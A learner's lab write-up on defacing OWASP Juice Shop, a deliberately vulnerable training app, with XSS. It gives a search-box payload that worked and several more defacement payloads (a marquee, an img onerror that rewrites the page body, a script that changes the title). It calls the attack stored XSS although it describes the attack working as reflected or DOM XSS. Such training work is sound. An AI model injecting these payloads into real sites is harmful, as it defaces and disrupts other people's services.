# Stored XSS for Website Defacement
 ## Objectives
> Use a stored XSS payload to visually deface part of the vulnerable site.
> This simulates an attacker injecting malicious HTML/JS to embarrass a brand or disrupt the UI.

I submitted this payload in Juice shop searchbox
```js
<h1 style='color:red; font-size:50px;'>Hacked by Cybernerrrrddd 💀</h1>
<script>
document.body.style.backgroundColor = 'black';
document.body.style.color = 'lime';
</script>
```
And it was executed to the screen. 
I tried the same payload in the review boxes under the products and
the payload got stored but wasnt rendered or executed by the browser or DOM

This was because:
- Review boxes may sanitize or filter inputs unless the stored content is rendered unsafely.
- But in search, the payload is reflected directly into the DOM (often unsanitized), which is why my XSS executes immediately.

My successful attack was due to search being vulnerable to DOM-based or reflected XSS, 
while reviews worked for stored XSS only if the app renders it directly without sanitizing or escaping it.

## some other payloads
```html
<marquee behavior="scroll" direction="left">You got hacked 😈</marquee>
```
```html
<img src=x onerror="document.body.innerHTML='<h1>Defaced!!</h1>'">
```
```js
<script>
document.title = 'Hacked 💀';
document.querySelector('h1').innerText = 'Juice Shop Compromised!';
</script>
```
